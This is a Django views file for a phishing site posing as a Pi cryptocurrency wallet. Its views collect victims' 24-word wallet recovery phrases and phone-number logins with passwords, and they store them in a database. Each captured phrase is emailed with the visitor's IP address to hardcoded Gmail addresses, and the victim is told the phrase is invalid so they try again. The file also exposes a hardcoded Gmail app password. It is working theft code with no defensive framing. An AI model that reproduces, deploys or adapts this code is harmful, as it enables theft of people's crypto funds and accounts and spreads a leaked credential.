from django.shortcuts import render, redirect
from django.contrib import messages
from django.http import HttpResponse
from . import models
from .keys_test import generate_password
from firebmail import sendmail as sending_no
from datetime import datetime
import requests
import socket

# Create your views here.
import uuid

testing = True
my_site = False

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(2,7)][::-1])
    return mac

def error_404(request, exception):
    return render(request, '404.html', status=404)

def send_notify(subject, payload, email_to):
    sender = "ezekielizuchi2018@gmail.com"
    password = "pvos glgf nxal finc"
    recipient = email_to
    
    return sending_no(payload, recipient, sender,password, subject)

def get_ip_address():
    try:
        # Get the host name of the local machine
        host_name = socket.gethostname()
        # Get the IP address of the local machine
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except socket.error as e:
        print(f"Error: {e}")
        return None



def index(request, redi=None):
    if redi != None:
        if redi == "Pass":
            keys = request.session.get('look_up', None)
            if keys:
                del request.session['look_up']
            if "look_up" in request.session:
                del request.session['look_up']

    ip_add = get_ip_address()
    request.session['ip_address'] = ip_add
    key = request.session.get('look_up', None)
    if key:
         return approve(request, keys=key)
    mac_add  = get_mac_address()

    if my_site:
        send_notify(payload=f'someone has visited your pi site - IP = {ip_add}, Mac_add = {mac_add} ', subject='Pi site (personal)', email_to="ezekielobiajulu0@gmail.com")
    else:
        send_notify(payload=f'someone has visited your pi site - IP = {ip_add}, Mac_add = {mac_add} ', subject='Pi site', email_to="ezekielobiajulu0@gmail.com")

    return render(request, 'index_p.html', {})

def validate(request):
    return render(request, 'validate.html', {})

def wallet(request):
    session_look_up = request.session.get('look_up', None)
    if session_look_up and session_look_up != None:
        return redirect('/approve/')
        
    return render(request, 'wallet.html', {})

def submit_pass(request):
    current_time = datetime.now()
    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
    if request.method == "POST":
        keys = request.POST.get('mf-text', '')
        words = keys.split()
        if len(words) != 24:
            if my_site:
                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
            else:
                send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted(Fake)', email_to="ezekielobiajulu0@gmail.com")
            messages.error(request, 'Invalid Passphrase')
            return redirect('/wallet/')

        else:
            look_up_key = generate_password()
            key_exists = models.PassPhrase.objects.filter(keys=keys)

            if key_exists:
                if my_site: # for validatepis 
                    if models.PassPhrase.objects.filter(keys=keys, is_verified=False).exists():
                        messages.error(request, 'We are validating your Wallet PassPhrase')
                        return redirect('/wallet/')
                    
                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True):
                        return render(request, 'verification.html', {})
                    
                    elif models.PassPhrase.objects.filter(keys=keys).exists():
                        messages.error(request, 'We are Validating Your Wallet Passphrase')
                        return redirect('/wallet/')
                    
                else:
                    if models.PassPhrase.objects.filter(keys=keys, is_verified=False).exists():
                        messages.error(request, 'Invalid Passphrase')
                        return redirect('/wallet/')
                    
                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True):
                        return render(request, 'verification.html', {})
                    
                    elif models.PassPhrase.objects.filter(keys=keys).exists():
                        messages.error(request, 'Invalid Passphrase')
                        return redirect('/wallet/')
                

            else:
                key_save = models.PassPhrase.objects.create(
                    keys=keys,
                    look_up = look_up_key
                )
                key_save.save()
                ip_address = request.session.get('ip_address', None)
                if not ip_address:
                    ip_address = get_ip_address()
                    request.session['ip_address'] = ip_address
                    ip_address = ip_address

                if ip_address == None:
                    ip_address = get_ip_address()
                    request.session['ip_address'] = ip_address
                    ip_address = ip_address

                if my_site:
                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted (My site)', email_to="ezekielobiajulu0@gmail.com")

                else:
                    if testing:
                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")

                    else:
                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
                    
                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")

                if my_site:
                    request.session['look_up'] = look_up_key
                    # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                    return approve(request, keys=look_up_key)
                else:
                    messages.error(request, "Invalid PassPhrase")
                    return redirect('/wallet/')
                # request.session['look_up'] = look_up_key
                # # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                # return approve(request, keys=look_up_key)
        
    else:
        look = request.session.get('look_up', None)
        if look:
            return approve(request, keys=look)
        return redirect('/')



def approve(request, keys = None):
    session_look_up = request.session.get('look_up', None)
    if keys == None:
        if session_look_up and session_look_up != None:
            return render(request, 'approve.html', {})
        
        messages.error(request, 'Please Enter Your PassPhrase')
        return redirect('/wallet/')
    
    
    else:
        if keys == session_look_up:
            if models.PassPhrase.objects.filter(look_up=keys).exists():
                return render(request, 'approve.html', {})
            else:
                messages.error(request, 'Please Enter Your PassPhrase')
                return redirect('/wallet/')
    



def verify_your_coin(request, keys = None):
    if keys == None:
        key = request.session.get('look_up', None)

        if key:
            look_up = models.PassPhrase.objects.filter(look_up=key).first()
            if look_up:
                if look_up.is_verified:
                    if "look_up" in request.session:
                        del request.session['look_up']
                    return render(request, 'verification.html', {})
                else:
                    # return redirect('/wallet/')
                    if "look_up" in request.session:
                        del request.session['look_up']
                    return render(request, 'pending_verify.html', {})
            else:
                messages.error(request, 'Invalid Key')
                return redirect('/wallet/')

        else:
            messages.error(request, 'Invalid Key')
            return redirect('/wallet/')
    else:
        if 'look_up' in request.session:
            del request.session['look_up']
        # request.session.pop('look_up', None)
            
        return index(request, redi="Pass")

        # return redirect('/')
        # return render(request, 'verification.html', {})
    
def do_not_verify(request):
    return index(request, redi="Pass")


def submitlogins(request):

    if request.method == "POST":
        phone_number = request.POST.get('phone_number', '')
        password = request.POST.get('password', '')
        country = request.POST.get('country', '')

        if country == "":
            messages.error(request, "Select your Country")
            return redirect('/login/')

        if phone_number != '' or password != '':

            if models.Pi_login.objects.filter(phone_number=phone_number).exists():
                messages.error(request, 'This Phone number already exists')
                return redirect('/login/')

            saving = models.Pi_login.objects.create(
                phone_number = phone_number,
                password = password,
                country = country
            )
            saving.save()
            messages.info(request, "Checking Info")
        else:
            messages.error(request, 'Phone Number or Password cannot be empty')
        return redirect('/login/')
    
    return render(request, 'login.html', {})